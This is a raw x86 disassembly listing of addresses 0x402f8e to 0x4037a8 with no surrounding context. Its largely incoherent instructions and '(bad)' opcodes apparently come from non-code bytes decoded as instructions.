  402f8e:	and    BYTE PTR [eax],0x0
  402f91:	rcl    BYTE PTR ds:0x53122,1
  402f97:	and    BYTE PTR [eax],dl
  402f99:	or     BYTE PTR [ebx],cl
  402f9b:	add    BYTE PTR [esp+eax*1],al
  402f9e:	add    BYTE PTR [ebx+0x60],cl
  402fa1:	add    DWORD PTR [ebp+0x484],esi
  402fa7:	add    BYTE PTR [edx+0x0],ch
  402faa:	test   esi,ecx
  402fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fad:	add    eax,0x141682
  402fb2:	and    BYTE PTR [eax],al
  402fb4:	inc    eax
  402fb5:	loopne 0x402fb9
  402fb7:	adc    ah,BYTE PTR [edx+eax*1]
  402fba:	push   eax
  402fbb:	add    dl,BYTE PTR [eax]
  402fbd:	and    bh,0x88
  402fc0:	and    BYTE PTR [edx],al
  402fc2:	and    eax,0x84801001
  402fc7:	mov    ds:0x80074841,al
  402fcc:	and    BYTE PTR [eax],al
  402fce:	add    BYTE PTR [eax+0x0],al
  402fd1:	inc    eax
  402fd2:	mov    BYTE PTR [eax+ecx*4],bh
  402fd5:	lea    ecx,[edx]
  402fd7:	xor    DWORD PTR [eax],0x1c149c06
  402fdd:	adc    DWORD PTR [edx],edx
  402fdf:	mov    DWORD PTR [edx+eax*4],eax
  402fe2:	or     al,0xd
  402fe4:	add    dl,BYTE PTR [eax+eax*2+0x8]
  402fe8:	add    BYTE PTR [ebp+0x50],0x0
  402fec:	add    edx,DWORD PTR [eax]
  402fee:	mov    BYTE PTR [edx],ah
  402ff0:	inc    eax
  402ff1:	or     DWORD PTR [eax],edx
  402ff3:	xor    BYTE PTR [edx+ecx*1],dl
  402ff6:	test   BYTE PTR [eax],al
  402ff8:	inc    eax
  402ff9:	inc    eax
  402ffa:	add    BYTE PTR [eax],al
  402ffc:	cmp    al,dh
  402ffe:	pushf  
  402fff:	mov    ds:0x181105c0,al
  403004:	or     BYTE PTR [edx],al
  403006:	mov    al,BYTE PTR [ecx-0x7f]
  403009:	sbb    DWORD PTR [edx],esi
  40300b:	pusha  
  40300c:	push   es
  40300d:	inc    eax
  40300e:	sub    DWORD PTR [eax],eax
  403010:	xchg   ebp,eax
  403011:	add    BYTE PTR gs:[edx],dl
  403014:	and    eax,0x9344680a
  403019:	and    al,0x41
  40301b:	mov    BYTE PTR [esi],dl
  40301d:	or     BYTE PTR [ecx+0x6f01860],al
  403023:	and    al,al
  403025:	add    eax,0x1230360c
  40302a:	or     ch,BYTE PTR [eax]
  40302c:	or     BYTE PTR [eax],0x2
  40302f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403030:	pop    ss
  403031:	nop
  403032:	add    BYTE PTR [esi],dl
  403034:	pop    eax
  403035:	adc    BYTE PTR [eax],0x2
  403038:	adc    dl,al
  40303a:	inc    edx
  40303b:	add    al,0x8
  40303d:	adc    al,0x5
  40303f:	test   BYTE PTR [edi],al
  403041:	rol    BYTE PTR [eax+edx*2],cl
  403044:	aam    0xa
  403046:	add    BYTE PTR [eax],al
  403048:	add    BYTE PTR [ecx+0x20a80320],al
  40304e:	sub    al,BYTE PTR [eax-0x7d4aebc0]
  403054:	add    al,dl
  403056:	push   eax
  403057:	push   eax
  403058:	add    al,BYTE PTR [ecx-0x77]
  40305b:	nop
  40305c:	mov    WORD PTR [eax],ds
  40305e:	adc    al,ah
  403060:	add    DWORD PTR [eax+0x802410a],eax
  403066:	mov    eax,ds:0x20c27248
  40306b:	inc    esp
  40306c:	adc    al,0x14
  40306e:	bound  ebx,QWORD PTR [ecx+ebp*1]
  403071:	sbb    al,0xa0
  403073:	cmp    BYTE PTR [ecx],al
  403075:	and    bh,BYTE PTR ds:0x20867836
  40307b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40307c:	add    BYTE PTR [esi],ah
  40307e:	xor    al,0x38
  403080:	and    BYTE PTR [edx],al
  403082:	jae    0x4030cc
  403084:	add    BYTE PTR ds:0x4440424,dl
  40308a:	add    BYTE PTR [ebx],cl
  40308c:	inc    esp
  40308d:	add    ebp,DWORD PTR [edx]
  40308f:	sub    BYTE PTR [eax-0x3f3df6d4],cl
  403095:	adc    DWORD PTR [eax+eax*1+0x40d8d3],0xd484498
  4030a0:	or     DWORD PTR [eax],eax
  4030a2:	push   es
  4030a3:	add    DWORD PTR ds:0x800b498,eax
  4030a9:	add    eax,0x13102242
  4030ae:	and    al,BYTE PTR [eax+0x68900800]
  4030b4:	and    DWORD PTR [eax],eax
  4030b6:	and    BYTE PTR [eax],al
  4030b8:	in     al,0xa
  4030ba:	add    esp,DWORD PTR [eax]
  4030bc:	add    BYTE PTR ds:0x6781160,ah
  4030c2:	add    esi,DWORD PTR [ecx]
  4030c4:	push   ds
  4030c5:	xor    BYTE PTR [ebp+0xc018590],cl
  4030cb:	add    BYTE PTR [eax],cl
  4030cd:	add    al,BYTE PTR [ebp+0x224504a]
  4030d3:	adc    DWORD PTR [edx],eax
  4030d5:	push   ss
  4030d6:	adc    ah,BYTE PTR [eax]
  4030d8:	xchg   al,cl
  4030da:	dec    ebx
  4030db:	add    DWORD PTR [eax-0x63],eax
  4030de:	add    al,BYTE PTR [esi+0x5]
  4030e1:	add    BYTE PTR ds:0xc04e9192,ah
  4030e7:	adc    BYTE PTR [esi+0x4044c010],0x35
  4030ee:	mov    WORD PTR [eax],es
  4030f0:	mov    dh,BYTE PTR [eax]
  4030f2:	add    DWORD PTR [eax+0x8],ecx
  4030f5:	loopne 0x40313b
  4030f7:	inc    eax
  4030f8:	adc    BYTE PTR [esp+eax*1],al
  4030fb:	xchg   ecx,eax
  4030fc:	add    al,0x24
  4030fe:	adc    eax,0x64411684
  403103:	add    DWORD PTR [eax],esp
  403105:	add    BYTE PTR [eax-0x7f],al
  403108:	push   ss
  403109:	xor    BYTE PTR [edi+0x1541cac0],cl
  40310f:	add    al,BYTE PTR [edx]
  403111:	inc    eax
  403112:	ret    0x4f24
  403115:	inc    eax
  403116:	and    BYTE PTR [ecx+ebp*1],ah
  403119:	mov    al,ds:0x34a13818
  40311e:	add    BYTE PTR [eax-0x7d],0x8
  403122:	dec    eax
  403123:	add    BYTE PTR [eax],al
  403125:	imul   eax,esp,0xe2002040
  40312b:	add    al,0x15
  40312d:	adc    BYTE PTR [eax],al
  40312f:	adc    DWORD PTR [edx],eax
  403131:	add    al,BYTE PTR [eax+0x20]
  403134:	xlat   BYTE PTR ds:[ebx]
  403135:	and    DWORD PTR [eax],eax
  403137:	and    BYTE PTR [eax],dh
  403139:	and    eax,0x640590c
  40313e:	add    ah,BYTE PTR [esp+ecx*2+0x0]
  403142:	mov    al,ds:0x20400216
  403147:	adc    DWORD PTR es:[ecx],esp
  40314a:	adc    BYTE PTR [eax+0x0],dl
  40314d:	add    cl,dl
  40314f:	inc    eax
  403150:	inc    ecx
  403151:	stos   BYTE PTR es:[edi],al
  403152:	add    eax,0xfa64304
  403157:	push   es
  403158:	and    BYTE PTR [eax+0x14],bl
  40315b:	or     eax,0x630840c0
  403160:	adc    ch,BYTE PTR [ebx]
  403162:	add    al,al
  403164:	add    BYTE PTR [eax+0x5d18c44a],al
  40316a:	inc    eax
  40316b:	add    BYTE PTR [edx],dl
  40316d:	and    BYTE PTR ds:0x249c8,0x44
  403174:	push   ss
  403175:	sub    BYTE PTR [eax+eax*1-0x7a],ah
  403179:	or     al,0x41
  40317b:	xor    al,0x8
  40317d:	inc    ecx
  40317e:	add    ah,BYTE PTR [ebx+0x4500810]
  403184:	add    DWORD PTR [esi-0x7d9feb80],esp
  40318a:	or     al,0x18
  40318c:	add    eax,eax
  40318e:	push   eax
  40318f:	cmp    DWORD PTR [eax],esp
  403191:	mov    al,0x0
  403193:	adc    DWORD PTR [edx+0x5e],ecx
  403196:	mov    BYTE PTR [eax],al
  403198:	dec    eax
  403199:	add    al,BYTE PTR [edx+0x2404a090]
  40319f:	dec    esp
  4031a0:	jnp    0x4031a2
  4031a2:	add    BYTE PTR [eax],bl
  4031a4:	and    cl,BYTE PTR [ecx+0x48]
  4031a7:	add    BYTE PTR [eax+0x0],0x8c
  4031ab:	add    dl,BYTE PTR [ecx+0x10022052]
  4031b1:	add    dl,BYTE PTR [ecx]
  4031b3:	sub    DWORD PTR [ecx],eax
  4031b5:	test   BYTE PTR [ecx+eax*4+0x40],dh
  4031b9:	add    ch,BYTE PTR [ebx+0x42184c44]
  4031bf:	or     ah,BYTE PTR [edx]
  4031c1:	push   es
  4031c2:	add    BYTE PTR [eax],cl
  4031c4:	add    ah,BYTE PTR [eax-0x70]
  4031c7:	shl    BYTE PTR [eax],0xd0
  4031ca:	inc    edx
  4031cb:	and    BYTE PTR [ecx],al
  4031cd:	and    eax,eax
  4031cf:	sbb    ecx,DWORD PTR [eax+0x24]
  4031d2:	or     BYTE PTR [eax],cl
  4031d4:	and    DWORD PTR [edx+0x4c002220],edx
  4031da:	add    al,0x12
  4031dc:	nop
  4031dd:	rol    BYTE PTR [eax+0x600c810],0x2
  4031e4:	or     esp,eax
  4031e6:	dec    edi
  4031e7:	mov    al,0x2a
  4031e9:	xor    BYTE PTR [eax+0x4c],al
  4031ec:	inc    eax
  4031ed:	dec    eax
  4031ee:	and    BYTE PTR [eax],dl
  4031f0:	mov    al,ds:0xa234b100
  4031f5:	add    BYTE PTR [eax-0x60aa7fc0],al
  4031fb:	push   ecx
  4031fc:	add    BYTE PTR [eax-0x5c],al
  4031ff:	add    DWORD PTR [edx],edx
  403201:	and    eax,0xb2095
  403206:	aaa    
  403207:	pop    eax
  403208:	(bad)  
  403209:	shl    BYTE PTR [eax],0xc2
  40320c:	adc    BYTE PTR [ebx+0x200808f2],cl
  403212:	add    BYTE PTR [eax+0x428c],al
  403218:	push   es
  403219:	add    cl,BYTE PTR [eax+0xd]
  40321c:	loop   0x403228
  40321e:	push   eax
  40321f:	pop    ebp
  403220:	xor    BYTE PTR [eax+0x3c611400],al
  403226:	inc    ebp
  403227:	mov    BYTE PTR [eax+0x9801105],al
  40322d:	pop    ecx
  40322e:	add    BYTE PTR [edx-0x7f],bl
  403231:	and    BYTE PTR [eax+eiz*1],ah
  403234:	push   eax
  403235:	add    al,al
  403237:	add    al,0x3
  403239:	test   DWORD PTR [ecx+0x4048982],eax
  40323f:	rcl    BYTE PTR [ecx],0x0
  403242:	push   es
  403243:	cmp    BYTE PTR [eax+0x40],al
  403246:	dec    eax
  403247:	push   ss
  403248:	adc    BYTE PTR [esi+ecx*4],cl
  40324b:	or     bl,BYTE PTR [edx]
  40324d:	push   edx
  40324e:	xor    eax,0x5f234203
  403253:	mov    ah,al
  403255:	xor    eax,DWORD PTR [esi+0x10]
  403258:	add    BYTE PTR [eax],ah
  40325a:	adc    BYTE PTR [eax],0x0
  40325d:	sub    BYTE PTR [eax],bl
  40325f:	sub    BYTE PTR [eax+0x28],dl
  403262:	add    BYTE PTR [ecx],al
  403264:	xor    al,0x3
  403266:	xor    DWORD PTR [ecx],esp
  403268:	inc    eax
  403269:	or     BYTE PTR [edx+0x40],bl
  40326c:	jo     0x403292
  40326e:	add    BYTE PTR [eax+0x255411c1],al
  403274:	add    DWORD PTR [ecx+0xa],eax
  403277:	or     al,BYTE PTR es:[edx]
  40327a:	inc    ebp
  40327b:	sub    al,BYTE PTR [ecx-0x60]
  40327e:	pusha  
  40327f:	and    al,0x10
  403281:	inc    ecx
  403282:	mov    BYTE PTR [ebx],al
  403284:	add    BYTE PTR [eax+0x2141212],0x20
  40328b:	add    dl,BYTE PTR [eax+0x0]
  40328e:	add    esi,eax
  403290:	add    DWORD PTR [esp+ecx*1+0x73108006],0x248201d2
  40329b:	sbb    al,0x4
  40329d:	add    ch,BYTE PTR [ebx+eax*1]
  4032a0:	and    BYTE PTR ds:0x48023620,cl
  4032a6:	or     BYTE PTR [eax+0x104e04],0xb1
  4032ad:	push   es
  4032ae:	mov    al,ds:0x250b0c20
  4032b3:	or     BYTE PTR [edx+0x54],0x0
  4032b7:	or     BYTE PTR [eax],0x82
  4032ba:	add    BYTE PTR [eax+eax*4],0x2
  4032be:	popa   
  4032bf:	add    al,0x8
  4032c1:	add    ah,BYTE PTR [edi+0x39a72242]
  4032c7:	add    ch,BYTE PTR [ecx]
  4032c9:	add    BYTE PTR [eax],0x9
  4032cc:	add    cl,BYTE PTR [eax-0x4e]
  4032cf:	add    BYTE PTR [edx],al
  4032d1:	nop
  4032d2:	cmc    
  4032d3:	add    BYTE PTR [eax],0x26
  4032d6:	mov    al,ds:0x1650810
  4032db:	add    BYTE PTR [ecx],ah
  4032dd:	add    BYTE PTR [eax],ah
  4032df:	xchg   edx,eax
  4032e0:	les    ecx,FWORD PTR [eax]
  4032e2:	mov    WORD PTR [eax-0x7f6e6bfd],es
  4032e8:	add    dl,ch
  4032ea:	add    BYTE PTR [edx+0x69],cl
  4032ed:	add    BYTE PTR [ebp+0x2c809442],al
  4032f3:	inc    edx
  4032f4:	add    BYTE PTR [edx-0x5ddb9e00],ah
  4032fa:	test   al,0x68
  4032fc:	push   eax
  4032fd:	add    eax,0x4840642
  403302:	add    ch,BYTE PTR [esi]
  403304:	push   es
  403305:	pop    edx
  403306:	cmp    DWORD PTR [ecx+0x8],edx
  403309:	adc    DWORD PTR [eax],ecx
  40330b:	pusha  
  40330c:	push   eax
  40330d:	add    al,0x6
  40330f:	or     BYTE PTR [esi],bl
  403311:	add    al,BYTE PTR [eax]
  403313:	pop    es
  403314:	mov    ds:0x2020750,al
  403319:	or     BYTE PTR [eax],0x80
  40331c:	add    BYTE PTR [eax+0x2],al
  40331f:	pusha  
  403320:	xchg   esp,eax
  403321:	and    DWORD PTR [esp+eax*1],esi
  403324:	es xchg esp,eax
  403326:	shl    al,0x0
  403329:	popa   
  40332a:	fcmove st,st(0)
  40332c:	add    eax,0x23100169
  403331:	add    dh,BYTE PTR [eax+eax*1+0x2]
  403335:	push   ecx
  403336:	add    BYTE PTR [edi],ch
  403338:	xor    BYTE PTR [eax+esi*4+0x66500021],al
  40333f:	and    BYTE PTR [eax+0xa460080],dl
  403345:	or     BYTE PTR [eax+edx*1-0xec2f306],ah
  40334c:	adc    ah,BYTE PTR [ecx+0x20600210]
  403352:	add    ah,BYTE PTR [edx]
  403354:	and    al,0x80
  403356:	or     al,BYTE PTR [edx+0x50]
  403359:	push   es
  40335a:	add    dl,BYTE PTR [eax*2+0xc2300a6]
  403361:	inc    eax
  403362:	pusha  
  403363:	imul   esi,DWORD PTR [esi-0x3ddddff9],0x4404040
  40336d:	adc    al,0x3d
  40336f:	add    al,BYTE PTR [eax]
  403371:	mov    al,0x94
  403373:	popa   
  403374:	add    DWORD PTR [ecx],0xd9111220
  40337a:	xchg   esp,eax
  40337b:	add    BYTE PTR [eax],ah
  40337d:	add    al,BYTE PTR [eax]
  40337f:	and    BYTE PTR [ecx+eax*1+0x1],cl
  403383:	cmp    ch,BYTE PTR [eax]
  403385:	mov    BYTE PTR [edx],al
  403387:	add    dl,BYTE PTR ds:0x45400041
  40338d:	add    DWORD PTR [eax+0x0],0x8c200160
  403394:	dec    esp
  403395:	adc    BYTE PTR [eax+0x48],ah
  403398:	mov    eax,ds:0x1a10a200
  40339d:	int3   
  40339e:	sbb    DWORD PTR ds:0x209c5140,eax
  4033a4:	sub    eax,0x1890f2c
  4033a9:	xor    BYTE PTR [ebx],ah
  4033ab:	adc    BYTE PTR [esi-0x5e],cl
  4033ae:	inc    edx
  4033af:	jo     0x4033c5
  4033b1:	add    cl,cl
  4033b3:	add    al,0x8
  4033b5:	and    al,0xc2
  4033b7:	dec    eax
  4033b8:	add    al,BYTE PTR [edx]
  4033ba:	pop    ax
  4033bc:	adc    al,0x75
  4033be:	cmp    eax,0x20cc0441
  4033c3:	or     al,BYTE PTR [ecx-0x7e]
  4033c6:	add    DWORD PTR [eax],edx
  4033c8:	or     BYTE PTR [ecx-0x5c],al
  4033cb:	es and al,0x8
  4033ce:	inc    eax
  4033cf:	adc    BYTE PTR [eax+0x11],al
  4033d2:	ret    
  4033d3:	adc    eax,0x86000104
  4033d8:	dec    ecx
  4033d9:	sbb    BYTE PTR [eax],bh
  4033db:	add    BYTE PTR [ecx],ch
  4033dd:	or     cl,BYTE PTR [eax+0x100144a1]
  4033e3:	push   ss
  4033e4:	add    al,0x46
  4033e6:	add    BYTE PTR [esp+eax*2-0x7fb763c0],al
  4033ed:	inc    ecx
  4033ee:	adc    DWORD PTR [ecx+0x8080094],eax
  4033f4:	mov    al,0x7c
  4033f7:	add    al,0x26
  4033f9:	sub    BYTE PTR [eax],al
  4033fb:	push   es
  4033fc:	or     al,BYTE PTR [ecx]
  4033fe:	rcl    BYTE PTR ds:[eax],0x0
  403402:	add    DWORD PTR [ebx+0x40],eax
  403405:	fs inc ecx
  403407:	adc    eax,DWORD PTR [eax+eax*1]
  40340a:	mov    al,ds:0xc90414
  40340f:	pop    eax
  403410:	xchg   ecx,eax
  403411:	xor    DWORD PTR [eax],ebp
  403413:	xlat   BYTE PTR ds:[ebx]
  403414:	add    BYTE PTR [edx],0x11
  403417:	or     DWORD PTR [ecx+0x2c0048],ecx
  40341d:	push   ss
  40341e:	adc    DWORD PTR [eax-0x4ffdf74f],edx
  403424:	adc    BYTE PTR [esi],al
  403426:	add    DWORD PTR [ecx],eax
  403428:	js     0x40344d
  40342a:	add    DWORD PTR [eax],0xc180903
  403430:	inc    ecx
  403431:	adc    BYTE PTR [eax+ecx*1+0x2b00404],dl
  403438:	add    eax,DWORD PTR [eax+0x33881b12]
  40343e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40343f:	mov    dl,0x0
  403441:	add    BYTE PTR [ecx+eiz*1],ah
  403444:	inc    edx
  403445:	ret    0xb00
  403448:	into   
  403449:	sbb    DWORD PTR [ecx],eax
  40344b:	shl    DWORD PTR [ebx+0x28010400],1
  403451:	or     BYTE PTR [eax+0x11082100],ah
  403457:	les    ecx,FWORD PTR [eax]
  403459:	mov    al,0x28
  40345b:	mov    ds:0x20406802,al
  403460:	mov    al,ds:0x370042
  403465:	add    cl,BYTE PTR [ecx]
  403467:	test   al,0x22
  403469:	add    eax,DWORD PTR [eax-0x3f]
  40346c:	xchg   edx,eax
  40346d:	xor    al,BYTE PTR [edx]
  40346f:	adc    al,BYTE PTR [eax+0x40a02822]
  403475:	and    BYTE PTR [ecx],0x86
  403478:	add    eax,0x80140010
  40347d:	pusha  
  40347e:	add    al,0xc4
  403480:	test   BYTE PTR [esi],bl
  403482:	add    BYTE PTR [eax],cl
  403484:	test   DWORD PTR [ecx],ebp
  403486:	xchg   BYTE PTR gs:[ecx+eax*1],ah
  40348a:	add    DWORD PTR [ecx+0x42480017],eax
  403490:	xchg   dl,ah
  403492:	or     eax,0x4100230
  403497:	or     esp,DWORD PTR [ecx]
  403499:	adc    DWORD PTR [ecx-0x3c6ffd98],ecx
  40349f:	inc    esi
  4034a0:	rol    BYTE PTR [eax+eax*2+0x1851709],0x40
  4034a8:	xor    BYTE PTR [esp+edx*1+0x3a003488],ah
  4034af:	or     DWORD PTR [eax+0x26],eax
  4034b2:	xor    al,BYTE PTR [eax+0x18001c02]
  4034b8:	add    BYTE PTR [ebp-0x80],dl
  4034bb:	inc    eax
  4034bc:	mov    dl,0x24
  4034be:	inc    ecx
  4034bf:	arpl   WORD PTR [ecx+0x22a1048],sp
  4034c5:	pusha  
  4034c6:	or     DWORD PTR [edx],esp
  4034c8:	mov    BYTE PTR [eax+0x24c828],al
  4034ce:	or     BYTE PTR [eax],ch
  4034d0:	sub    BYTE PTR [edx+eax*1],ch
  4034d3:	and    ah,BYTE PTR [eax+0x42]
  4034d6:	dec    ebp
  4034d7:	add    ch,BYTE PTR [ecx+ecx*4+0x4d060080]
  4034de:	and    al,BYTE PTR [eax-0x7feefb28]
  4034e4:	sub    BYTE PTR [eax+esi*1],ah
  4034e7:	mov    al,0x0
  4034e9:	add    al,0x23
  4034eb:	inc    eax
  4034ec:	add    ecx,DWORD PTR [eax-0x2ffffff3]
  4034f2:	mov    ebp,0x2c0640c8
  4034f7:	dec    ebp
  4034f8:	add    dl,dl
  4034fa:	cdq    
  4034fb:	add    BYTE PTR [eax],0x55
  4034fe:	and    BYTE PTR [eax],al
  403500:	sbb    al,0xc1
  403502:	test   DWORD PTR [ebp+0x3],ebx
  403505:	xor    DWORD PTR [eax+0x0],eax
  403508:	add    BYTE PTR [eax],dl
  40350a:	add    al,cl
  40350c:	dec    edx
  40350d:	add    al,cl
  40350f:	adc    BYTE PTR [ecx+0x2],al
  403512:	loope  0x403524
  403514:	mov    al,ds:0x1508a
  403519:	add    al,BYTE PTR [esi]
  40351b:	adc    BYTE PTR [eax+0x12],al
  40351e:	add    BYTE PTR [edx],ah
  403520:	add    DWORD PTR [ecx-0x7e],0x0
  403524:	jecxz  0x403508
  403526:	and    al,0x4
  403528:	xor    BYTE PTR [eax+0x70280235],0x12
  40352f:	and    BYTE PTR ds:0x28404068,bl
  403535:	and    BYTE PTR [ebx+0x70],al
  403538:	pusha  
  403539:	push   es
  40353a:	add    BYTE PTR [edi],dl
  40353c:	add    BYTE PTR [edx],ah
  40353e:	add    BYTE PTR [eax],dl
  403540:	inc    eax
  403541:	sbb    al,0x48
  403543:	lock and ah,BYTE PTR [eax-0x7e]
  403547:	add    DWORD PTR [esi+0x0],0x54802821
  40354e:	add    DWORD PTR [edx],ebx
  403550:	mov    ds:0x4080c14,al
  403555:	add    BYTE PTR [eax],dl
  403557:	adc    al,0x4
  403559:	jecxz  0x403563
  40355b:	shl    BYTE PTR [esi+ecx*8-0x74],0xa5
  403560:	or     DWORD PTR [edx],ebx
  403562:	jo     0x4035b5
  403564:	and    BYTE PTR [esi-0x5e],0x11
  403568:	inc    ecx
  403569:	and    BYTE PTR [eax],ah
  40356b:	add    BYTE PTR [eax],0x2c
  40356e:	or     BYTE PTR [ebx-0x7fbbe3f0],ah
  403574:	add    al,0x44
  403576:	inc    eax
  403577:	aam    0x80
  403579:	add    ch,BYTE PTR [edx+0x269c242]
  40357f:	add    BYTE PTR [eax],al
  403581:	adc    DWORD PTR [ecx],0x40262841
  403587:	and    dh,BYTE PTR [eax-0x68]
  40358a:	inc    eax
  40358b:	call   0x1c69e12
  403590:	add    al,0x8
  403592:	add    BYTE PTR [eax+0x18817806],ah
  403598:	and    BYTE PTR [esi+0x3032203d],al
  40359e:	or     eax,0x3d190a84
  4035a3:	push   ss
  4035a4:	jl     0x403526
  4035a6:	mov    al,0x10
  4035a8:	xor    eax,DWORD PTR ds:0xa1608c04
  4035ae:	adc    dh,dl
  4035b0:	adc    edi,DWORD PTR [edi]
  4035b2:	inc    esp
  4035b3:	adc    al,0x1a
  4035b5:	or     BYTE PTR [ecx],dl
  4035b7:	jo     0x4035f9
  4035b9:	add    al,BYTE PTR [eax]
  4035bb:	movups xmm2,XMMWORD PTR [bx+si]
  4035bf:	inc    esi
  4035c0:	add    DWORD PTR [edx+0x1],eax
  4035c3:	das    
  4035c4:	or     cl,BYTE PTR [ebp-0x1deaf2f8]
  4035ca:	and    eax,0x5ce84510
  4035cf:	or     DWORD PTR [ecx+0x2],eax
  4035d2:	or     BYTE PTR [eax],al
  4035d4:	add    al,0xc8
  4035d6:	(bad)  
  4035d8:	and    al,al
  4035da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035db:	mov    BYTE PTR [eax],al
  4035dd:	or     al,BYTE PTR [eax+eax*2]
  4035e0:	and    al,0x8e
  4035e2:	add    eax,0x308282
  4035e7:	add    DWORD PTR [eax],eax
  4035e9:	adc    BYTE PTR [edx+0x10],cl
  4035ec:	adc    al,0x20
  4035ee:	nop
  4035ef:	or     BYTE PTR [eax],ah
  4035f1:	mov    ds:0x40c31c02,al
  4035f6:	add    eax,DWORD PTR [eax+0xc081084]
  4035fc:	adc    BYTE PTR [ebx],cl
  4035fe:	enter  0xd4b6,0x22
  403602:	inc    esp
  403603:	lea    ecx,[edx]
  403605:	add    al,0xb0
  403607:	or     eax,0x46150a93
  40360c:	pop    eax
  40360d:	add    al,0x32
  40360f:	pusha  
  403610:	inc    ecx
  403611:	or     DWORD PTR [eax+0x46],eax
  403614:	ret    0x5806
  403617:	sub    BYTE PTR [eax],al
  403619:	nop
  40361a:	add    BYTE PTR [eax],cl
  40361c:	add    BYTE PTR [edx-0x76],dl
  40361f:	add    DWORD PTR [eax],eax
  403621:	inc    ecx
  403622:	add    BYTE PTR ds:0x4646142,dl
  403628:	inc    ebp
  403629:	push   esp
  40362a:	add    DWORD PTR [eax],eax
  40362c:	jbe    0x4035c1
  40362e:	adc    DWORD PTR [eax],ecx
  403630:	and    BYTE PTR [eax],dl
  403632:	add    BYTE PTR [eax+0x0],al
  403635:	add    DWORD PTR [edx+eax*2+0x7a4a9240],ecx
  40363c:	rcr    BYTE PTR [eax+0x16028001],1
  403642:	inc    eax
  403643:	dec    esp
  403644:	mov    BYTE PTR [eax],0x41
  403647:	or     BYTE PTR [eax],0x2
  40364a:	xchg   edx,eax
  40364b:	mov    cl,BYTE PTR [eax]
  40364d:	or     al,0xa5
  40364f:	or     al,0x18
  403651:	or     eax,DWORD PTR [eax+0x58]
  403654:	add    ebp,eax
  403656:	push   es
  403657:	sbb    BYTE PTR [esp],cl
  40365a:	or     dl,bl
  40365c:	xor    DWORD PTR [edx],eax
  40365e:	and    BYTE PTR [eax-0x1ffcef8b],dh
  403664:	or     BYTE PTR [esp+ecx*2],dl
  403667:	adc    dl,BYTE PTR [esi+0x8000002]
  40366d:	and    BYTE PTR [ecx+0x201610d],al
  403673:	sub    BYTE PTR [eax+0x8],bl
  403676:	or     BYTE PTR [edx+0x41420810],dl
  40367c:	or     edx,DWORD PTR [eax]
  40367e:	shl    BYTE PTR [eax],0x5
  403681:	add    ah,BYTE PTR [esi]
  403683:	test   DWORD PTR [eax+ebp*1],esp
  403686:	add    BYTE PTR [ebp+0x118f4800],0x2
  40368d:	test   DWORD PTR [eax],ecx
  40368f:	push   eax
  403690:	xchg   esp,eax
  403691:	or     BYTE PTR [eax],cl
  403693:	push   esi
  403694:	add    bl,BYTE PTR [esi+0x28d64283]
  40369a:	adc    DWORD PTR [eax+esi*2],edi
  40369d:	add    DWORD PTR [ecx+0x4c],eax
  4036a0:	push   eax
  4036a1:	xor    eax,DWORD PTR [ebx]
  4036a3:	xor    eax,0x40424a52
  4036a8:	inc    ebx
  4036a9:	pusha  
  4036aa:	sub    eax,DWORD PTR [eax+0x18000010]
  4036b0:	test   BYTE PTR [ebp+0xe],al
  4036b3:	pop    ecx
  4036b4:	mov    al,ds:0x6054088
  4036b9:	mov    al,ds:0x22000103
  4036be:	adc    BYTE PTR [ecx],al
  4036c0:	add    BYTE PTR [ecx+0x20],al
  4036c3:	js     0x4036c6
  4036c5:	pop    ds
  4036c6:	add    BYTE PTR [ecx+0x5c660646],0xd2
  4036cd:	add    eax,DWORD PTR [ecx]
  4036cf:	adc    DWORD PTR [eax+0x8],0x84050502
  4036d6:	pop    ecx
  4036d7:	inc    eax
  4036d8:	and    al,BYTE PTR [eax-0x3f76ff9f]
  4036de:	cdq    
  4036df:	dec    ecx
  4036e0:	or     BYTE PTR [edx],0x42
  4036e3:	adc    eax,0x811c4c1
  4036e8:	(bad)  
  4036e9:	push   es
  4036ea:	jbe    0x40367c
  4036ec:	add    DWORD PTR [edx+ecx*1],0x29
  4036f0:	sbb    DWORD PTR [eax+0x40],ecx
  4036f3:	dec    edx
  4036f4:	and    ah,BYTE PTR [eax]
  4036f6:	adc    BYTE PTR [ecx+0x21064],cl
  4036fc:	and    al,0x10
  4036fe:	or     al,0x0
  403700:	add    al,0x59
  403702:	add    DWORD PTR [eax-0x2ffaaeae],esp
  403708:	mov    esp,0x1041200
  40370d:	sub    BYTE PTR [eax],al
  40370f:	adc    al,0x80
  403711:	adc    eax,0x10149011
  403716:	add    al,0xc1
  403718:	adc    BYTE PTR [edi+0x1],dl
  40371b:	inc    eax
  40371c:	fld    DWORD PTR [eax]
  40371e:	and    BYTE PTR [eax],dl
  403720:	mov    WORD PTR ds:0x20c2108,es
  403726:	sub    BYTE PTR [edx],cl
  403728:	call   DWORD PTR ds:0x43518c
  40372e:	push   eax
  40372f:	or     DWORD PTR [eax+0x8b12420],ecx
  403735:	and    DWORD PTR [esp+ecx*4],ecx
  403738:	add    ah,BYTE PTR [eax]
  40373a:	add    BYTE PTR [edx+0xd025452],ah
  403740:	add    al,BYTE PTR [edx+ebp*1-0x7e2d8fe8]
  403747:	adc    cl,bl
  403749:	and    al,BYTE PTR [edx]
  40374b:	xchg   esp,eax
  40374c:	call   0x2000:0x7a00b0e5
  403753:	add    DWORD PTR [ecx-0x6a],0x11000814
  40375a:	sub    BYTE PTR [eax+0x6038aa04],al
  403760:	push   es
  403761:	add    dl,ch
  403763:	adc    dl,BYTE PTR [eax+eiz*1-0x7ee5fff8]
  40376a:	inc    ecx
  40376b:	add    BYTE PTR [ecx+0x28a64200],cl
  403771:	mov    al,ds:0xc0f07660
  403776:	and    cl,BYTE PTR [eax]
  403778:	mov    BYTE PTR ds:0x24004432,dl
  40377e:	add    cl,BYTE PTR [ecx+eax*4]
  403781:	add    al,0x40
  403783:	add    BYTE PTR [esi],al
  403785:	add    al,0x12
  403787:	mov    cl,0xc0
  403789:	push   es
  40378a:	push   eax
  40378b:	mov    ds:0x80c0110,al
  403790:	test   DWORD PTR [edx],ecx
  403792:	and    BYTE PTR [eax],al
  403794:	adc    al,0x88
  403796:	mov    ds:0x800c58,al
  40379b:	adc    al,0x40
  40379d:	add    BYTE PTR [edx-0x4ff3db80],ah
  4037a3:	add    al,0x44
  4037a5:	inc    eax
  4037a6:	or     BYTE PTR [eax],al
  4037a8:	loopne 0x4037ca
